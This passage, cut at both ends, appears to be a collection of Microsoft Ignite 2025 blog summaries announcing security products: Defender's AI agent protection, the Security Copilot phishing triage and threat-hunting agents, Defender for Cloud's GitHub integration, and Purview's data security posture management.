its kind capability combines graph insights, AI, and threat intelligence to predict potential attack paths for where the adversary might go next. It then applies just-in-time hardening techniques that proactively block the attacker from pivoting. Some of the hardening tactics that will automatically be applied by Microsoft Defender include disabling SafeBoot and enforcing Group Policy Objects, putting a hard stop to the attacker\u2019s movements and ability to execute common techniques for compromise. Learn more about predictive shielding and other endpoint security news. Protect your low-code and pro-code AI agents Generative AI and agents are rapidly transforming how we work, but these powerful new tools also introduce new risks. And with the democratization of agent creation across pro-code, low-code, and no-code building platforms, building agents is now accessible to everyone, many without extensive developer or security knowledge. To help security teams better manage these risks we are excited to announce that we are extending the capabilities and experiences in Microsoft Defender to the protection of agents. From agent security posture management, to attack path analysis, and threat protection for Copilot Studio, Azure Foundry, and agents built and connected via the Microsoft Agent 365 SDK. Learn more about how Microsoft Defender can help protect your agents against threats like prompt injections and more. There is so much more innovation we are introducing in Microsoft Defender today, including expanded endpoint security coverage for legacy systems, improvements to how you can investigate identity-centric threats, and we are bringing cloud security posture management into the Defender portal.

      "title": "Microsoft Ignite 2025: Transforming Phishing Response with Agentic Innovation",
      "summary": "Phishing attacks remain one of the most persistent and damaging threats to organizations worldwide. Security teams are under constant pressure to investigate a growing number of user reported phishing emails daily, ensuring accurate verdicts and timely responses. As threats grow in volume and sophistication, SOC teams are forced to spend valuable time triaging and investigating, often at the expense of strategic defense and proactive threat hunting. At Microsoft Ignite 2025 we are delivering innovation that showcases our continued commitment to infuse AI agents, and agentic workflows into the core of our email security solution and SOC operations to automate repetitive tasks, accelerate investigations, and provide transparent, actionable insights for every reported phishing email. In addition, we continue to invest in our ecosystem partnerships to empower customers with seamless integrations, as they adopt layered security solutions to comply with regulatory requirements, enhance detection, and ensure robust protection. Today I\u2019m excited to announce: General Availability of the Security Copilot Phishing Triage Agent Agentic Email Grading System in Microsoft Defender Cisco and VIPRE Security Group join the Microsoft Defender ICES ecosystem The Security Copilot Phishing Triage Agent is now generally available In March 2025, we introduced the Phishing Triage Agent , designed to autonomously handle user-submitted phishing reports at scale. The agent classifies incoming alerts, resolves false positives, and escalates only the malicious cases that require human expertise. Today, we\u2019re announcing its general availability. We will also be extending the agent to triage alerts for identity and cloud alerts. The Phishing triage agent automates repetitive tasks, accelerates investigations, and every decision is transparent, allowing security teams to focus on what matters most\u2014investigating real threats and strengthening the overall security posture. Early results prove how it is transforming analyst work: Identified 6.5X more malicious alerts Improved verdict accuracy by 77% Agent supported analysts spent 53% more time investigating real threats Agentic email grading: Advanced analysis of phishing email submissions When customers report suspicious messages to Microsoft, they expect clarity, speed, and actionable insights to protect their environment. They expect a response they can trust, understand easily, and take additional investigation and response action for the organization. Previously, when customers reported messages to Microsoft, our response depended largely on manual human grader reviews, creating delays and inconsistent verdicts. Customers often waited several hours for a response, and sometimes it lacked clarity on how a verdict was reached. Today, we are excited to announce that we integrated an agentic grading system into the Microsoft Defender submission analysis and response workflow when customers report phishing messages to Microsoft. Image 2: Agentic Email Grading: Advanced analysis of phishing email submissions The agentic grading system brings a new level of speed and transparency to phishing analysis. It uses large language models (LLMs) orchestrated within an agentic workflow to analyze phishing emails, assess the full content of a submitted email, and communicate context and related metadata. This system combines advanced AI with existing machine learning models and human review for additional levels of accuracy and transparency for decision making. Every verdict comes with higher quality, clear verdicts, and context-rich explanations tailored to each phishing email submission. Additionally, it establishes a feedback mechanism that enhances continuous learning and self-healing, thereby strengthening and optimizing protection over time. By reducing reliance on manual reviews, users will experience lower wait times, faster responses and higher-quality results. It will enable security teams to respond promptly and act confidently against phishing threats. Over time we plan to expand beyond phishing verdicts to include spam, scam, bulk, and clean classifications , making the process more comprehensive. The system will continue to evolve through feedback and adapt to emerging attack patterns. How to view agentic submission responses in Microsoft Defender When you report a suspicious email\u2014whether as an admin or an end user\u2014you can now see how Microsoft Defender\u2019s new agentic grading system evaluates your submission. To view agentic grading system responses, follow the steps below: Report the suspicious email Submit the email through the admin submission or user-reported submission process. Sign in to Microsoft Defender Go to https://security.microsoft.com. Navigate to Submissions From the left menu, select: Investigation & response > Actions & submissions > Submissions. Choose the correct tab Emails for admin submissions User reported for user submissions Open the submission details Click the email submission you want to review. A flyout panel will display Result details. Look for the Agentic AI note If the verdict was generated by Agentic AI, you\u2019ll see: \u201cAI-generated content may be incorrect. Check it for accuracy.\u201d Image 3: AI generated explainable verdicts Expanding the Integrated Cloud Email Security (ICES) ecosystem In June, we introduced the Microsoft Defender ICES vendor ecosystem , a unified framework that enables seamless integration of Microsoft\u2019s Defender\u2019s email security solution with trusted third-party vendors.

      "title": "Start Secure and Stay Secure on your AI Agent Journey with Microsoft Defender",
      "summary": "Introduction The power of AI agents is their autonomy \u2013 their ability to understand context, dynamically adjust workflows, orchestrate tooling, and act with little to no human interaction. But that same autonomous decision-making amplifies security risks. Not only are we seeing a geometric rise in the volume of agents being added to our workforce, but the attack techniques and surface area these agents introduce are fundamentally different than anything before. Analysts expect more than 1.3 billion agents will be in operation by 2028. To put that into perspective, if they were their own country today, they would rank 3rd in population, behind only India and China. The proliferation of pro-code, low-code, and no-code agent-building platforms is further democratizing agent creation and will continue to drive the massive growth we expect in the coming years. These new waves of AI tinkerers, many without extensive developer-level security knowledge, have the potential to introduce additional risks without even realizing it. Today, we are excited to announce new capabilities in Microsoft Defender that help security administrators and security analysts manage agent risks and threats, as part of Microsoft Agent 365. Security teams will now benefit from a unified approach to manage posture and protect against threats across the AI agent lifecycle. Introducing AI Agent security within Microsoft Defender At Ignite 2025, Microsoft Defender is announcing the preview of unified posture management and threat protection for AI agents. These new agent security capabilities will be added to existing product experiences, as well as Microsoft Agent 365. This evolution broadens Defender\u2019s AI security capabilities to cover agentic AI services on pro-code platforms like Microsoft Foundry and low-code/no-code environments such as Copilot Studio. AI security posture management for Microsoft Foundry agents, as well as threat protection for Copilot Studio agents, are now in preview. Threat protection for Microsoft Foundry agents will be available soon. Core Capabilities 1. Comprehensive Visibility for AI Agents Gain a unified, risk-based inventory of AI agents across Microsoft Foundry and Copilot Studio to eliminate blind spots and reduce shadow agents. Defender consolidates metadata, instructions, identities, and connected tools\u2014helping security administrators manage sprawl and maintain control. Unlike point solutions, Defender\u2019s posture, alerts, and response capabilities cover the entire AI stack within a unified portal and experience. Figure 1: AI agent inventory in Defender 2. Risk Reduction for AI Agents Defender strengthens posture by identifying misconfigurations, excessive permissions, and insecure instructions. AI security posture recommendations and detailed attack path analysis contextualize how weak spots from Microsoft Foundry agents form broader risks for the organization, enabling proactive remediation before breaches occur. Pre-built advanced hunting queries help security teams spot potential vulnerabilities within Copilot Studio agents. Figure 2: Attack path analysis for AI agents 3. Threat Protection for AI Agents The rise of AI agents introduces entirely new threats that traditional security tools aren\u2019t equipped to handle, including prompt injection and privilege compromise. Attackers can exploit an agent\u2019s language understanding with manipulative inputs that evade classic defenses, demanding fresh approaches to security. Defender is expanding its threat protections for generative AI to include new protection for AI agent-specific threats. New jailbreak attempt alerts and real-time blocking of unsafe tool invocation for Copilot Studio agents are automatically correlated with broader threat signals and insights from the industry-leading Microsoft Threat Intelligence, to deliver contextual alerts and incident-level visibility. Similar detections for Microsoft Foundry agents will also be available in preview soon. Figure 3: Threat protection for AI agents Above-mentioned threat signals are further contextualized within Microsoft Defender and Sentinel, seamlessly connecting Microsoft\u2019s security, AI, and DevOps platforms like Microsoft Defender, Foundry, Copilot Studio, and GitHub Advanced Security, helping organizations start secure and shift AI security farther left. Additionally, Defender is expanding the threat hunting experience to include logs for Copilot Studio, Azure Foundry, and agents built on third-party agent builder platforms through the A365 SDK. This enhancement will provide security teams with even more insight into agentic threats and incident context. Customer Scenarios With these capabilities, customers can protect AI agents better with these specific use cases: Gain visibility and insight: Eliminate shadow agents and unify AI asset management across multi-cloud platforms. \u2022 Conduct risk reduction: Understand vulnerabilities with posture recommendations and prioritize proactive hardening with attack-path analysis. \u2022 Threat protection: Monitor runtime activity for malicious patterns, block prompt injection attacks, and correlate signals for incident context. What Sets Defender Apart AI agents are just one of many potential threat vectors within your organization that attackers may target. Unlike point solutions, Defender offers build-to-runtime protection across the AI stack\u2014models, agents, SaaS apps, and cloud infrastructure. The power of this unified approach is that it extends beyond AI. Correlating security posture, attack paths, and alerts across endpoints, identities, applications, cloud infrastructure, and other signals helps security practitioners better understand threats and coordinate response within a single experience, reducing complexity and enabling continuous security.

      "title": "Microsoft Defender for Cloud Innovations at Ignite 2025",
      "summary": "In today\u2019s AI-powered world, the boundaries of security are shifting fast . From code to runtime, organizations are moving faster than ever \u2013 building with AI across clouds, accelerating innovation, and expanding the landscape defenders must protect. Security teams are balancing fragmented tools, growing complexity and a new generation of intelligent, agentic systems that learn, adapt and act across the digital estate. The challenge isn\u2019t understanding the change \u2013 it\u2019s staying ahead of it. At Ignite 2025, we\u2019re unveiling four major advancements in Microsoft Defender for Cloud that redefine how security keeps pace with cloud-scale innovation and AI autonomy . Together, they advance a simple idea \u2013 that security should move as fast as the systems it protects, adapting in real time to new patterns of risk. Defender for Cloud + GitHub Advanced Security integration delivers AI-driven, automated remediation We start where every application does: in the code \u2013 and with a major step forward in how security and development teams work together. The pace of development has scaled dramatically . Organizations now build more than 500 new apps 1 on average each year \u2013 and as code volume grows, the gap between development and security widens. Working in separate tools with no shared context, developers can\u2019t see which threats security teams prioritize, and security teams can\u2019t easily trace issues back to their source in code. To help organizations address this challenge, Microsoft Defender for Cloud now natively integrates with GitHub Advanced Security (in public preview) \u2013 the first native link between runtime intelligence and developer workflows, delivering continuous protection from code to runtime. This bidirectional integration brings Defender for Cloud\u2019s runtime insights directly into GitHub, so vulnerabilities can be surfaced, prioritized, and remediated with AI assistance \u2013 all within the developer environment. When Defender for Cloud detects a critical vulnerability in a running workload, developers see exactly where the issue originated in code, how it manifests in production, and the suggestion of how to fix the vulnerability. With Copilot Autofix and GitHub Copilot coding agent capabilities, AI-generated and validated fixes are suggested in real time \u2013 shortening remediation cycles from days to hours. For organizations, this integration delivers three tangible benefits: Collaborate without friction. Security teams can open and track GitHub issues directly from Defender for Cloud with context and vulnerability details, ensuring shared visibility between security and development. Accelerate remediation with AI. Copilot-assisted fixes make it faster and safer to resolve vulnerabilities without breaking developer flow. Prioritize what matters most. By mapping runtime threats directly to their source in code, teams can focus on vulnerabilities that are truly exploitable \u2013 not just theoretical. Together, security, development, and AI now move as one , finding and fixing issues faster and creating a continuous feedback loop that learns from runtime, feeds insights back into development, and redefines how secure apps and agents get built in the age of AI. Unified posture management and threat protection extends to secure AI Agents The next frontier is securing the AI agents teams create \u2013 ensuring protection evolves as fast as the intelligence driving them. IDC projects that organizations will deploy 1.3 billion AI agents by 2028 2 , each capable of reasoning, acting, and accessing sensitive data across multiple environments. As these systems scale, visibility becomes the first challenge: knowing what agents exist, what data they touch, and where risks connect. And with 66% of organizations 3 planning to establish a formal AI risk management function within the next four years , it\u2019s clear that security leaders are racing to catch up with this next evolution. To help organizations stay ahead, Microsoft Defender now provides unified posture management and threat protection for AI agents as a part of Microsoft Agent 365 (in preview). These first-of-its-kind capabilities that secure agentic AI applications across their entire lifecycle. With this innovation, Defender helps organizations secure AI agents in three critical ways: Comprehensive visibility for AI Agents . Gain unified visibility and management of AI agents through Defender, spanning both pro-code and low-code environments from Microsoft Foundry to Copilot Studio. With a single agent inventory, teams can see where agents run and what they connect to \u2013 reducing shadow AI and agent sprawl. Risk reduction through posture management . Proactively strengthen AI agents\u2019 security posture with Defender\u2019s posture recommendations and attack path analysis for AI agents. These insights reveal how weak links across agents and cloud resources can form broader risks, helping teams detect and address vulnerabilities before they lead to incidents. Threat protection for AI Agents . Detect, investigate, and respond to threats targeting agentic AI services across models, agents from Microsoft Copilot Studio and Microsoft Foundry, and cloud applications using Defender\u2019s AI-specific detection analytics. These include scenarios like prompt injection, sensitive data exposure, or malicious tool misuse, all enriched with Microsoft\u2019s unmatched threat intelligence for deeper context and faster response. By embedding security into every layer of the agentic AI lifecycle , Defender helps organizations start secure and stay secure. This unified approach ensures that as AI agents evolve and scale, protection scales with them, anchoring the same continuous security foundation that extends across code, cloud, and beyond. Cloud posture management extends to secure serverless resources Defender for Cloud\u2019s unified foundation extends beyond agents \u2013 to the cloud infrastructure and platforms that power them \u2013 rounding out the protection that scales with innovation itself. That innovation is increasingly running on serverless computing, now a core layer of cloud-native and AI-powered application development. It gives teams the speed and simplicity to deliver faster, but also expands the attack surface across multicloud environments with new exposure points, from unsecured functions to lateral movement risks. To help organizations secure this expanding layer, Microsoft Defender for Cloud is extending its Cloud Security Posture Management (CSPM) to serverless compute and application platforms (available in preview by end of November). With this new coverage, security teams gain greater visibility into serverless compute environments and application platforms, including Azure Functions, Azure Web Apps, and AWS Lambda. Defender for Cloud integrates serverless posture insights into attack path analysis , helping security teams identify and visualize risk, continuously monitor and detect misconfigurations, and find vulnerable serverless resources \u2013 further strengthening security posture across the modern application lifecycle. This extension brings serverless computing into the same unified protection model that already secures code, containers, and workloads in Defender for Cloud. As customers modernize with event-driven architectures, Defender for Cloud evolves with them, delivering consistent visibility, control, and protection across every layer of the cloud. Deeper expansion into the Defender Portal turns fragmentation into focus Finally, bringing all the signals security teams depend on into one place requires a single operational hub \u2013 a unified security experience that delivers clarity at scale . Yet with 89% of organizations operating across multiple clouds 4 and using an average of 10 security tools to protect them 5 , teams struggle to manage risk across fragmented dashboards and disjointed data \u2013 slowing detection and response and leaving blind spots that attackers can exploit. To help security teams move faster and act with clarity, we\u2019re announcing the public preview of unified cloud security posture management into the Microsoft Defender security portal . With Microsoft Defender for Cloud\u2019s deep integration into the unified portal, we eliminate security silos and bring a modern, streamlined experience that is more intuitive and purpose-built for today\u2019s security teams. With this deep integration, Microsoft delivers three key advancements: A new Cloud Security dashboard that unifies posture management and threat protection, giving security teams a complete view of their multicloud environment in one place. Integrated posture capabilities within Exposure Management. Security teams can now see assets, vulnerabilities, attack paths, secure scores, and prioritized recommendations in a single pane of glass, focusing on the issues that matter most. A centralized asset inventory that consolidates resources across Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP) , enabling posture validation, logical segmentation, and simplified visibility aligned to operational needs. To complement these capabilities, granular role-based access control (RBAC) helps reduce operational risk and simplify compliance across multicloud environments. The Microsoft Defender portal is now the center of gravity for security teams \u2013 bringing together cloud, endpoint and identity protection into one connected experience . Looking ahead, customers will soon be able to onboard and secure new resources directly within the Defender portal, streamlining setup and accelerating time to value. Large organizations will also gain the ability to manage multiple tenants from this unified experience as the rollout expands. The Azure portal remains essential for Defender for Cloud personas beyond security teams, such as DevOps. Adding new resource coverage will continue in the Azure portal as part of this transition. We\u2019ll also keep enhancing experiences for IT and operations personas as part of our broader vision, read more on that in the latest news here . Ready to explore more?

      "title": "Security Copilot for SOC: bringing agentic AI to every defender",
      "summary": "Cybersecurity has entered an era of relentless complexity. As threat actors increasingly leverage artificial intelligence to automate attacks, evade detection, and scale their tactics, defenders are challenged to keep up. In this new era, security operations centers (SOCs) must transform to not just react, but to anticipate, disrupt, and outpace the next wave of cyberthreats. Microsoft\u2019s goal is to empower every organization to meet this challenge head-on by transforming how security operates. We believe the future of the SOC is more than just agentic: it\u2019s predictive and proactive. This means moving beyond fragmented tools and manual processes, and instead embracing a unified, intelligent approach where AI-driven skills and agents work in concert with human expertise. To bring this vision to life, it\u2019s essential to look at the SOC through the lens of its lifecycle\u2014a dynamic continuum that spans from anticipation and prevention through to recovery and optimization\u2014and to recognize the unique challenges and opportunities within each stage. With Security Copilot\u2019s GenAI and agentic capabilities woven across this lifecycle, Microsoft is delivering an integrated defense platform that enables defenders to move faster, act smarter, and stay ahead of adversaries. Introducing agentic innovation across the SOC lifecycle At Ignite, our agentic innovations are concentrated in three of the five SOC lifecycle pillars, and each one represents a leap forward in how analysts anticipate, detect, triage and investigate threats. Predict and prevent Threat Intelligence Briefing Agent : Introduced in March , this agent has already helped security teams move from reactive to anticipatory defense. At Ignite, we\u2019re announcing that the Threat Intelligence Briefing Agent is now fully embedded in the Microsoft Defender portal, delivering daily, tailored briefings that synthesize Microsoft\u2019s unparalleled global intelligence with organization-specific context in just minutes. Teams no longer need to spend hours gathering TI from disparate sources\u2014the agent automates this process, offering the most current and relevant insights. Analysts can reference the summary to prioritize action, using the agent\u2019s risk assessments, clear recommendations, and links to vulnerable assets to proactively address exposures. Detect and disrupt Dynamic Threat Detection Agent : Detections have long been bottlenecked by the limitations of traditional alerting systems, which rely on predefined logic that can\u2019t scale fast enough to match the speed and variability of modern attacks\u2014 resulting in blind spots and missed threats. The Dynamic Threat Detection Agent addresses this challenge head-on. Instead of depending on static rules or isolated input, it continuously analyzes incidents and telemetry, searching for gaps in coverage and correlating signals across the entire security stack. For example, this is how it surfaced a recent AWS attack: a threat actor used an EntraID account to federate into an AWS admin account to exfiltrate sensitive data. The Dynamic Threat Detection Agent generated an alert before the intruder even authenticated into the single sign-on flow, driven by a correlated signal from Sentinel. That alert didn\u2019t exist beforehand; the agent created it on the fly to stop the attack. The result is an adaptive system that extends Microsoft\u2019s industry-leading, research-based detections with context-aware alerts tailored to each organization, closing gaps and revealing threats that legacy systems miss. Triage and investigate Phishing Triage Agent: In March 2025, we introduced the Phishing Triage Agent, built to autonomously handle user-submitted phishing reports at scale. The agent classifies incoming alerts and resolves false positives, escalating only the malicious cases that require human expertise. At Microsoft Ignite, we\u2019re announcing its general availability, backed by strong early results : the agent identifies 6.5 times more malicious alerts, improves verdict accuracy by 77%, and frees analysts to spend 53% more time investigating real threats. St. Luke\u2019s even said it\u2019s saving their team nearly 200 hours each month . Coming soon, we\u2019ll be extending these autonomous triage capabilities beyond phishing to identity and cloud alerts, bringing the same precision and scale to more SOC workflows. Threat Hunting Agent: this agent reimagines the investigation process. Instead of requiring analysts to master complex query languages or sift through mountains of data, Threat Hunting Agent enables natural language investigations with contextual insight. Analysts can vibe with the agent by asking questions in plain English, receive direct answers, and be guided through comprehensive hunting sessions. It levels up the existing Security Copilot NL2KQL capability by enabling teams to explore patterns, pivot intuitively and uncover hidden signals in real time for a fluid, context-aware experience. This not only accelerates investigations but makes advanced threat hunting accessible to every member of the SOC, regardless of experience level. Agents built into your workflows To make the agents easily accessible and help security teams get started more quickly, we are excited to announce that Security Copilot will be available to all Microsoft 365 E5 customers. Rollout starts today for existing Security Copilot customers with Microsoft 365 E5 and will continue in the upcoming months for all Microsoft 365 E5 customers. Customers will receive 30-day advanced notice before activation. Learn more: https://aka.ms/SCP-Ignite25 Discover more: the Security Store The Security Store, now generally available, is the central hub for discovering, deploying, and managing first-party and third-party security agents. Today, it provides instant access to 20+ agents deployable directly in the Microsoft Defender portal, all within a broader ecosystem of 100+ trusted security solutions. Whether you're investigating incidents, hunting threats, or automating response, the Security Store extends Defender with vetted, scenario-aligned tools that can be set up in minutes. Learn more in this blog . Introducing new GenAI embedded capabilities Security Copilot isn\u2019t just growing through agents\u2014it\u2019s also gaining new embedded capabilities: GenAI skills that help SOC teams work faster, operate at greater scale, and get upleveled directly inside Microsoft Defender. Today, we\u2019re excited to introduce new innovations: Analyst Notes represent a meaningful shift in how investigation work is captured and shared. For organizations that choose to opt into this capability, Copilot automatically reconstructs an analyst\u2019s investigation session\u2014from the moment they open an incident to the moment they close it\u2014and turns that activity into clear, structured notes. The system can even track multiple sessions in parallel and attribute actions to the right incident, and analysts can fully review and edit the generated notes before saving them. This not only saves teams valuable time and effort, it preserves the actual investigation path with far greater accuracy and consistency than manual documentation ever could. The result is a living, cumulative record of how the SOC investigates threats: easier handoffs, stronger auditability, faster onboarding, and a deeper shared understanding of how incidents unfold across multiple SecOps members and phases. Standard Operating Procedures (SOPs) for guided response allows organizations to upload their own internal procedures so Security Copilot can align its recommendations with established guidebooks and compliance requirements. Guided response is one of the ways Copilot helps analysts navigate an incident: it offers one-click actions across triage, containment, investigation and remediation that teams can take immediately. With SOPs uploaded, these recommendations draw directly from organizational workflows and policy standards, ensuring they are contextually relevant and trusted. For defenders, this translates into greater confidence and faster, more consistent decision-making. We\u2019re also eager to share that we\u2019re introducing auto-generated content configuration for Security Copilot\u2019s incident summaries . This new feature allows security admins to decide how and when summaries are produced, choosing between always auto-generating, manual trigger only, or auto-generating based on incident severity. The configuration is managed directly in the Microsoft Defender portal, giving organizations flexibility to fine-tune Copilot\u2019s outputs to their operational needs. Join us at Ignite We invite you to learn more and see these innovations in action at Microsoft Ignite.

      "title": "Beyond Visibility: The new Microsoft Purview Data Security Posture Management (DSPM) experience",
      "summary": "In today\u2019s AI-powered enterprises, understanding your data estate\u2014and the risks that come with it\u2014is both more complex and more critical than ever. Meanwhile, many organizations still grapple with a fragmented data security landscape, relying on a patchwork of disconnected tools that obscure visibility and hinder effective data security posture management. As AI adoption accelerates, entirely new data risk vectors are emerging\u2014ranging from oversharing and compliance gaps to operational inefficiencies. According to recent research [1] , 40% of data security incidents now occur within AI applications, and 78% of AI users are bringing their own AI tools to work. This challenge is further compounded by the rise of AI agents, creating a scenario that demands a unified, context-aware approach to understanding and securing data within trusted workflows. This is where data security posture management helps organizations - by providing the visibility and control they need across sprawling data estates and evolving risk surfaces. By continuously assessing data security posture, organizations can better identify gaps and remediate risks, avoiding fragmented efforts. However, even with these capabilities, many organizations still struggle to stay focused on the ultimate goal\u2014achieving meaningful security outcomes rather than simply managing tools or processes. To overcome this, organizations must shift their perspective: seeing data security not as a collection of individual solutions, but as a holistic program anchored in desired business and security outcomes. Managing data security posture should become the foundation for building a sustainable and healthy data security program\u2014one that continuously improves, drives measurable resilience, strengthens trust, and systematically reduces risk across the enterprise. At Microsoft Ignite, we\u2019re excited to share the newly enhanced Microsoft Purview Data Security Posture Management (DSPM) experience \u2014an AI-powered, centralized solution that focuses on the goals your organization needs to accomplish, and helps you strengthen data security to confidently embrace AI apps and agents with actionable insights, new third-party signals, and Security Copilot agents. Enabling AI and agents confidently with enhanced data security posture The enhanced DSPM experience is designed to simplify data security posture by stitching together the scenarios and goals customers need to achieve when it comes to their data. We are combining the depth of Purview visibility and controls with the breadth of external signals and agentic activities, complemented by Security Copilot agents, to provide a strong, proactive DSPM experience. See what\u2019s new in Purview DSPM: \u25aa Outcome-based guided workflows: To avoid the guesswork of interpreting insights and determining the next best actions, now customers can manage their data security posture by selecting which data security outcome to prioritize and the risks related to each\u2014shifting from reactive visibility to actionable, outcome-driven insights. For each outcome, this experience will guide customers through the key metrics and risk patterns present in their organization, as well as a recommended action plan, including the expected impact of taking those actions. For example, if an admin chooses to address the risk of \u201cPreventing sensitive data exfiltration to risky destinations,\u201d DSPM will show how many sensitive files are at risk, how many have been exfiltrated to personal domains or external cloud services in the past 30 days, and provide recommended actions to mitigate these risks. These actions may include creating a new DLP policy and an IRM policy to detect and prevent such exfiltration to personal emails, and admins can see the impact each of these actions will have. After that, they can continuously assess their data security posture through the outcome metrics. [Figure 1: List of data security objectives, with metrics and remediation plans per objective] \u25aa External data source visibility: Organizations trust Microsoft for collaboration and productivity, but their footprint spans to external data platforms too. To provide a more complete and comprehensive view of data risks across the digital estate, we\u2019re excited to announce the advancement of the Purview partner ecosystem, with the inclusion of third-party signals in DSPM through the collaboration with our partners Varonis, BigID, Cyera and OneTrust. This partnership, possible via integration with Microsoft Sentinel Data Lake, is designed to help organizations see and understand more of their data\u2014wherever it resides. Through DSPM, a customer will be able to easily turn on these external data signals and evaluate data asset information (such as permissions, location, sensitive information types) in these environments. Available sources initially will be: Salesforce (provided by Varonis), Databricks (provided by BigID), Snowflake (provided by Cyera), and Google Cloud Platform (provided by OneTrust), with additional external data coverage coming soon. By integrating these external data sources into Purview, data security teams gain extended visibility into sensitive data across third-party platforms alongside their Microsoft data, which also empowers teams to raise their confidence when adopting AI apps and agents by expanding visibility on external data that is referenced by those tools. This collaboration not only eliminates blind spots and strengthens risk posture, but also simplifies data security operations with a single, streamlined experience. These signals will be offered using pay-as-you-go billing through Microsoft Sentinel consumptive meters. Learn more here . [Figure 2: Asset explorer with external data from Databricks, Snowflake, Google Cloud Platform, and Salesforce] \u25aa New out-of-the-box reports for posture insights: DSPM also extends visibility by presenting new out-of-the-box reports that deliver immediate visibility into top-of-mind metrics organizations care about, such as protection coverage via Sensitivity labels, Data Loss Prevention (DLP) policy triggers, and posture trends over time. With advanced filtering options and deep drilldowns, security teams can quickly identify unprotected sensitive data, track label adoption, monitor policy effectiveness, and surface potential risks earlier. These actionable insights streamline monitoring and support precise policy fine-tuning, enabling data security teams to shift from reactive operations to proactive, data-driven strategic decisions. \u25aa Expanded coverage and remediation on Data Risk Assessments: DSPM now extends Data Risk Assessments to item-level analysis with automated new remediation actions like\u2014enabling bulk disabling of overshared SharePoint links and direct activation of protection policies. Starting from an outcome-based remediation plan or the Data Risk Assessment tab, teams can take targeted actions such as removing or tightening sharing links, notifying owners, and applying or updating sensitivity labels\u2014including new support for bulk manual labeling from search\u2014so fixes occur where the risky items reside, and progress is immediately reflected in posture metrics. Beyond Microsoft 365, Data Risk Assessments have also expanded to Microsoft Fabric, surfacing Fabric assets in a new default assessment and proactive actions to protect new Fabric assets with DLP policies or sensitivity labels. These enhancements address key customer challenges around visibility gaps, fragmented remediation workflows, and governance across hybrid environments. AI agents are growing rapidly in enterprise environments, bringing unique data risks that traditional security can\u2019t address. Their autonomous actions and broad access to sensitive information create complex risk profiles tied to behavior, not just identity. To stay secure, organizations need data protection strategies that treat agents as first-class entities with tailored visibility, risk scoring, and policy controls. DSPM is also adapting to this new scenario: \u25aa AI Observability for agents: We\u2019re introducing a dedicated view within DSPM that treats agents\u2014such as the ones created on Microsoft 365 Copilot, Copilot Studio, and Azure AI Foundry\u2014as first-class entities in your organizations when it comes to data security posture. It provides a unified inventory of all agents \u2013 including third-party agents \u2013 as well as the assigned insider risk level based on the agent behavior, posture metrics, and activity trends of each agent. Security teams can drill down into individual agents to see contextual insights like risky behaviors, oversharing patterns, and can take recommended actions, such as the creation of retention policies. AI Observability gives customers clear visibility across agents and connects insights to guided actions\u2014 simplifying governance, facilitating risk prioritization, and enabling secure AI adoption without slowing innovation. [Figure 3: AI Observability plane with inventory of 1st and 3rd party agents within the organization, as well as assigned risk level per agent] Learn more about all the innovations we are announcing to help you safely adopt agents . Redefining data security posture for the AI-powered era The new DSPM experience marks a pivotal moment in Microsoft Purview\u2019s journey to secure the modern enterprise. By unifying visibility, protection, and investigation across human and agentic data activity, Purview empowers organizations to embrace AI responsibly, reduce risk, and drive continuous improvement in their data security posture. When it comes to leveraging built-in AI within data security solutions, admins can view proactive or summary insights and launch a Data Security Investigation (DSI) directly from DSPM. This important integration allows admins to utilize the power and scale of DSI analysis to take a closer look at data risks. Furthermore, applying AI to strengthen data security is just as critical as securing AI itself, as AI-powered solutions help organizations anticipate and neutralize risks at scale, and agents have the potential to take data security processes to another level, increasing automation and allowing teams to focus on the most pressing risks. That\u2019s why we\u2019re thrilled to introduce the Data Security Posture Agent, designed to augment the new Purview DSPM experience even further. This agent leverages LLMs to understand context and intent, going beyond traditional classifiers that can often miss nuance. It analyzes selected file sets and generates precise reports on requested information, such as merger & acquisition details or PO numbers. Armed with these insights, admins can decide on their own next steps, whether that\u2019s applying new labels, updating policies, or initiating investigations, streamlining discovery and risk reduction in one intelligent, outcome-driven experience. This capability tackles the challenges of manual, time-consuming data analysis and limited visibility into sensitive information, helping organizations achieve faster resolution, stronger compliance posture, and greater operational efficiency. [Figure 4: Data Security Posture Agent to discover sensitive data and take appropriate actions] Combined with the Data Security Triage agent and other Security Copilot capabilities integrated within Purview, the Data Security Posture agent creates a robust AI-powered foundation for modern data security teams. To make the agents easily accessible and help teams get started more quickly, we are excited to announce that Security Copilot will be available to all Microsoft 365 E5 customers. Rollout starts today for existing Security Copilot customers with Microsoft 365 E5 and will continue in the upcoming months for all Microsoft 365 E5 customers. Customers will receive advanced notice before activation. Learn more: https://aka.ms/SCP-Ignite25 Building the future of data security alongside customers As organizations navigate this new era of AI-driven innovation, the ability to secure data confidently and proactively is no longer optional\u2014it\u2019s mission-critical. Microsoft Purview DSPM delivers a unified, outcome-based approach that transforms complexity into clarity, guiding teams from insight to action with precision. Current solutions Purview DSPM and DSPM for AI will remain available until June, when the new Purview DSPM experience becomes the centralized solution. Costumers\u2019 top-of-mind capabilities within current workflows, such as Data Risk Assessments and Security Copilot prompt gallery, will also be available within the new DSPM experience. These new capabilities will be available in Public Preview within the next few weeks. By extending visibility across external sources, introducing AI observability, and empowering remediation through intelligent agents, Purview enables enterprises to embrace AI and agents without compromise\u2014strengthening trust, reducing risk, and driving continuous improvement in data security posture.

      "title": "Enhancing visibility into your identity fabric with Microsoft Defender",
      "summary": "Attackers don\u2019t move in straight lines or follow predictable, sequential steps. Instead, they think in graphs, seeking the path of least resistance, surveying your environment for weak spots and then leverage legitimate connections and permissions to quietly traverse your IT landscape. Just a single compromised account can be a powerful foothold, helping an attacker bypass your other security protocols. To put this simply, while your account may not be what the attacker is looking for, it\u2019s one step on the path to their ultimate goal. Its estimated that less than 1% of your organizational footprint is actually of interest to attackers, but 80% of organizations have at least one open attack path to these critical assets. This is why it is so critical to have a deep understanding of the connected identities, accounts and applications that make up your identity fabric. Layered identity security for the modern enterprise Identity Threat Detection and Response (ITDR) has to combine modern identity and access management (IAM) and security operations (SOC) through an integrated partnership between identity and security teams . Because of this, our vision remains focused on streamlining how these groups collaborate, breaking down siloes to unite these teams, their tools and processes. Today, I am excited to announce new enhancements to the identity security experience within Defender that will help enrich your security team\u2019s visibility and understanding into your unique identity fabric. These new capabilities include: Account correlation links related accounts and corresponding insights to provide identity-level visibility and insights to the SOC. Coordinated response allows Defenders to take action comprehensively across connected accounts, accelerating response and minimizing the potential for lateral movement. Account correlation: Mapping the identity fabric, one account at a time. Modern identity fabrics are often complex, reflecting the reality of today\u2019s hybrid and multi-cloud enterprise environments. To understand vulnerabilities and map potential attack paths, security teams must first decipher the relationships between identities, accounts, infrastructure, and a 